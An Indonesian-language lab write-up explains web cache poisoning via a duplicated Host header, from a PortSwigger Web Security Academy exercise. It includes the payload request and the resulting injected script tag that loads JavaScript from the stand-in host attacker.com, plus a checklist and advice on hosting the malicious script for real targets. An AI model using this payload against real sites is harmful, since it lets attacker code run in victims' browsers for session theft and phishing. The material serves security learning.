# Web Cache Poisoning via Ambiguous Requests

## 📖 Konsep

Lab ini memanfaatkan **Web Cache Poisoning** yang dikombinasikan dengan:

- Host Header Injection
- Ambiguous Request Parsing
- Cache Key Mismatch

Tujuan akhirnya adalah membuat **cache menyimpan response yang telah dimodifikasi**, sehingga seluruh pengguna menerima response tersebut.

Pada lab ini:

- Backend memvalidasi Host pertama.
- Backend menggunakan Host kedua untuk membangun absolute URL.
- Cache hanya melihat URL request sehingga menganggap response valid dan menyimpannya.
- Browser korban memuat JavaScript dari server attacker.

---

## ⚙️ Cara Kerja

```
GET /

Host: lab.web-security-academy.net
Host: attacker.com
        │
        ▼
Backend Validasi
Host Pertama
        │
        ▼
Generate HTML
Host Kedua
        │
        ▼
<script src="https://attacker.com/resources/js/tracking.js">
        │
        ▼
Cache Menyimpan Response
        │
        ▼
Korban Membuka Home
        │
        ▼
Response dari Cache
        │
        ▼
Browser Download tracking.js
        │
        ▼
JavaScript Berjalan
di Origin Website
```

---

## 🧠 Root Cause

Cache dan Backend memproses request dengan cara berbeda.

- Backend memvalidasi Host pertama.
- Backend menggunakan Host kedua ketika membuat absolute URL.
- Cache tidak mengetahui perubahan tersebut sehingga response disimpan.
- Browser menjalankan JavaScript yang berasal dari domain attacker tetapi tetap dalam origin website korban.

---

## 🎯 Alur Serangan

1. Identifikasi response yang dapat di-cache.
2. Tambahkan cache buster agar selalu memperoleh response baru.
3. Tambahkan Host Header kedua.
4. Amati apakah Host kedua direfleksikan pada HTML.
5. Host file JavaScript pada server attacker.
6. Poison cache sampai memperoleh Cache HIT.
7. Korban membuka halaman.
8. Browser korban mengunduh JavaScript dari attacker.
9. JavaScript dijalankan pada origin website korban.

---

## 🎯 Payload

### Request

```http
GET /?cb=123 HTTP/1.1
Host: victim.com
Host: attacker.com
```

### Response

```html
<script src="https://attacker.com/resources/js/tracking.js"></script>
```

---

## 🌍 Real Target

PortSwigger menyediakan Exploit Server.

Di dunia nyata kamu harus memiliki server sendiri yang dapat meng-host file JavaScript.

Contoh:

- GitHub Pages
- Vercel
- Cloudflare Pages
- VPS
- Server pribadi

Misalnya response aplikasi berubah menjadi:

```html
<script src="https://attacker.com/static/app.js"></script>
```

Maka server attacker harus menyediakan:

```
/static/app.js
```

Jika response berubah menjadi:

```html
<script src="https://attacker.com/resources/js/tracking.js"></script>
```

Maka server attacker harus menyediakan:

```
/resources/js/tracking.js
```

Yang harus disesuaikan adalah **path** yang diminta browser.

---

## 🔎 Checklist Real Target

### 1. Apakah ada Cache?

Cari indikator seperti:

```
Age
X-Cache
CF-Cache-Status
Cache-Control
```

Contoh menarik:

```
X-Cache: HIT
Age: 60
```

---

### 2. Apakah Input Direfleksikan?

Misalnya:

- Host Header
- X-Forwarded-Host
- URL
- Query Parameter

Harus muncul kembali di response.

---

### 3. Apakah Response Bisa Dipakai User Lain?

Kalau hanya request kita sendiri yang berubah,
bukan Web Cache Poisoning.

Harus dipastikan cache membagikan response tersebut.

---

### 4. Apakah Ada Sink Berbahaya?

Contoh sink:

```
<script src="">
```

```
<link href="">
```

```
<img src="">
```

```
<meta>
```

Semakin berbahaya sink tersebut,
semakin tinggi impact.

---

## ❓ Kenapa JavaScript Berjalan di Website Korban?

Browser hanya mengambil file JavaScript dari domain attacker.

Kemudian browser menjalankan isi file tersebut pada halaman yang sedang dibuka.

Misalnya:

```
https://victim.com/
```

HTML:

```html
<script src="https://attacker.com/tracking.js"></script>
```

Browser:

- Download file dari attacker.
- Menjalankan JavaScript pada halaman victim.com.

Bukan pada attacker.com.

---

## 📚 Pelajaran Lab

- Host Header Injection belum tentu menghasilkan impact.
- Cache membuat exploit mengenai seluruh user.
- JavaScript dari domain attacker tetap berjalan pada origin website korban.
- WCP biasanya merupakan gabungan beberapa kelemahan, bukan satu bug.

---

## ⚡ Hafalan Cepat

```
Host Injection
        │
        ▼
Reflection
        │
        ▼
Cache
        │
        ▼
Korban
        │
        ▼
Download JS
        │
        ▼
JavaScript Jalan
di Origin Korban
```

---

## 🔑 Inti Lab

**Bug Class**

```
Web Cache Poisoning
```

**Root Cause**

```
Backend dan Cache memproses Host Header secara berbeda.
```

**Payload**

```
Host: victim.com
Host: attacker.com
```

**Indikator**

```
X-Cache: HIT
Age
CF-Cache-Status
```

**Impact**

- Client-Side XSS
- Defacement
- Session Theft (jika cookie tidak HttpOnly)
- Phishing
- JavaScript Injection

---

## 📝 Mindset Saat Hunting

Jangan langsung mencari Web Cache Poisoning.

Selalu tanyakan:

✓ Apakah input saya masuk ke response?

↓

✓ Apakah response di-cache?

↓

✓ Apakah user lain menerima cache yang sama?

↓

✓ Apakah reflection tersebut memiliki impact?

Kalau keempatnya "YA", kemungkinan besar terdapat attack chain menuju Web Cache Poisoning.
